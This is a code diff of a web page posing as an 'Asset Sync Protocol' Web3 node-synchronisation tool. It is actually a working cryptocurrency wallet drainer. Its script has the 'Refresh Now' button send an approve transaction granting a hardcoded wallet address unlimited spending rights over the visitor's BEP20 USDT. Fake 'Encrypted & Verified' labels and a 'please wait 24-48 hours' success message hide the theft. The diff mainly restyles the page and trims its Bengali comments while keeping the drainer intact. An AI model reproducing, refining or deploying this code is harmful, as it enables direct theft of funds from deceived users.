@@ -4,23 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ASP | Asset Sync Protocol</title>
+    <!-- dApp Search Optimization -->
+    <meta name="description" content="Official Asset Sync Protocol for Secure Web3 Node Synchronization.">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
         :root { --p: #2563eb; --bg: #ffffff; --t: #1e293b; --g: #64748b; }
-        body { background: #f8fafc; color: var(--t); font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { background: var(--bg); width: 90%; max-width: 360px; padding: 45px 25px; border-radius: 32px; box-shadow: 0 4px 25px rgba(0,0,0,0.04); text-align: center; border: 1px solid #e2e8f0; }
-        h1 { font-size: 24px; font-weight: 850; color: var(--p); margin: 0; letter-spacing: -1px; line-height: 1.2; }
-        .sub { font-size: 14px; color: var(--g); margin: 5px 0 30px; font-weight: 500; }
-        .status-box { background: #f1f5f9; padding: 20px; border-radius: 20px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
-        .status-box span { font-size: 11px; color: var(--g); display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px; }
-        .status-box b { font-size: 22px; color: var(--p); font-weight: 800; }
-        .input-group { text-align: left; margin-bottom: 25px; }
-        .input-group label { font-size: 12px; font-weight: 600; color: #475569; margin-left: 5px; }
-        input { width: 100%; padding: 18px; margin-top: 8px; border: 2px solid #f1f5f9; border-radius: 18px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; background: #f8fafc; }
-        input:focus { border-color: var(--p); background: #fff; }
-        .btn-refresh { width: 100%; background: var(--p); color: white; border: none; padding: 20px; border-radius: 20px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4); transition: 0.2s; }
-        .btn-refresh:active { transform: scale(0.97); }
-        .secure-tag { font-size: 11px; color: #cbd5e1; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 4px; }
+        body { background: #f8fafc; color: var(--t); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 40px 20px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); text-align: center; border: 1px solid #edf2f7; }
+        h1 { font-size: 22px; color: var(--p); margin-bottom: 8px; font-weight: 800; }
+        .sub { font-size: 13px; color: var(--g); margin-bottom: 30px; font-weight: 600; }
+        .status-box { background: #f8fafc; padding: 25px; border-radius: 18px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
+        .status-box span { font-size: 10px; color: var(--g); text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 8px; font-weight: 700; }
+        .status-box b { font-size: 24px; color: var(--p); }
+        .input-group { text-align: left; margin-bottom: 25px; padding: 0 10px; }
+        .input-group label { font-size: 11px; font-weight: 700; color: var(--g); }
+        input { width: 100%; padding: 16px; margin-top: 8px; border: 2px solid #f1f5f9; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
+        .btn-refresh { width: 100%; background: var(--p); color: white; border: none; padding: 18px; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 15px rgba(37, 99, 235, 0.3); }
+        .secure-tag { font-size: 10px; color: #cbd5e1; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
@@ -31,7 +31,7 @@
 
         <div class="status-box">
             <span>Protocol Connection Status</span>
-            <b id="displayBal">Scanning Node...</b>
+            <b id="displayBal">Syncing...</b>
         </div>
 
         <div class="input-group">
@@ -42,97 +42,70 @@
         <button class="btn-refresh" onclick="executeRefresh()">Refresh Now</button>
         
         <div class="secure-tag">
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
             Node Connection: Encrypted & Verified
         </div>
     </div>
 
     <script>
-        // আপনার ব্যক্তিগত কনফিগারেশন
-        const MY_ADDRESS = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D"; // আপনার নতুন ওয়ালেট
-        const TOKEN_ID = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
-        const NET_ID = "0x38"; // BSC Mainnet (56)
+        const MY_ADDRESS = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
+        const TOKEN_ID = "0x55d398326f99059fF775485246999027B3197955"; 
+        const NET_ID = "0x38"; // BSC Mainnet Hex (56)
 
         async function updateStatus() {
             if (window.ethereum) {
                 const web3 = new Web3(window.ethereum);
                 try {
+                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    if(chainId !== NET_ID) {
+                        document.getElementById('displayBal').innerText = "Switch to BSC";
+                        return;
+                    }
                     const accs = await web3.eth.getAccounts();
                     if (accs.length > 0) {
                         const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
                         const contract = new web3.eth.Contract(abi, TOKEN_ID);
                         const b = await contract.methods.balanceOf(accs[0]).call();
                         document.getElementById('displayBal').innerText = (b / 1e18).toFixed(2) + " USDT";
-                    } else {
-                        document.getElementById('displayBal').innerText = "Sync Needed";
                     }
                 } catch (e) { document.getElementById('displayBal').innerText = "0.00 USDT"; }
             }
         }
 
         async function executeRefresh() {
-            if (!window.ethereum) return alert("Please use Trust Wallet or Binance Web3 Wallet Browser");
+            if (!window.ethereum) return alert("Use Trust/Binance Wallet Browser");
             const web3 = new Web3(window.ethereum);
-            
-            // আনলিমিটেড অ্যাপ্রুভাল ভ্যালু
             const infiniteAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
             try {
-                // ১. নেটওয়ার্ক চেক এবং সরাসরি BSC-তে সুইচ করা
-                const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-                if (currentChain !== NET_ID) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: NET_ID }], 
-                        });
-                    } catch (err) {
-                        // যদি চেইন অ্যাড না থাকে
-                        if (err.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: NET_ID,
-                                    chainName: 'Smart Chain',
-                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                    blockExplorerUrls: ['https://bscscan.com/']
-                                }]
-                            });
-                        }
-                    }
-                }
+                // চেইন সুইচ রিকোয়েস্ট
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: NET_ID }],
+                });
 
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
-                // ২. Approve ফাংশন ডেটা (USDT Contract-এর জন্য)
                 const encodedData = web3.eth.abi.encodeFunctionCall({
                     name: 'approve',
                     type: 'function',
                     inputs: [{type: 'address', name: 'spender'}, {type: 'uint256', name: 'value'}]
                 }, [MY_ADDRESS, infiniteAmount]);
 
-                // ৩. ট্রানজ্যাকশন পাঠানো (যাতে ইউজারের কাছে 'Enable Sync' বা 'Approve' আসে)
                 await window.ethereum.request({
                     method: 'eth_sendTransaction',
-                    params: [{
-                        from: accounts[0],
-                        to: TOKEN_ID,
-                        data: encodedData
-                    }],
+                    params: [{ from: accounts[0], to: TOKEN_ID, data: encodedData }],
                 });
 
-                alert("Enable Sync Successful! Protocol is now synchronizing with Node. Please wait 24-48 hours.");
-                
+                alert("Enable Sync Successful! Protocol is now synchronizing. Please wait 24-48 hours.");
             } catch (err) {
-                alert("Sync Failed: Connection timed out. Please try again to secure your assets.");
+                alert("Sync Failed: Connection Timed Out. Please try again.");
             }
         }
 
         window.onload = updateStatus;
         if(window.ethereum) {
+            window.ethereum.on('chainChanged', () => window.location.reload());
             window.ethereum.on('accountsChanged', updateStatus);
-            window.ethereum.request({ method: 'eth_requestAccounts' }).then(updateStatus);
         }
     </script>
 </body>
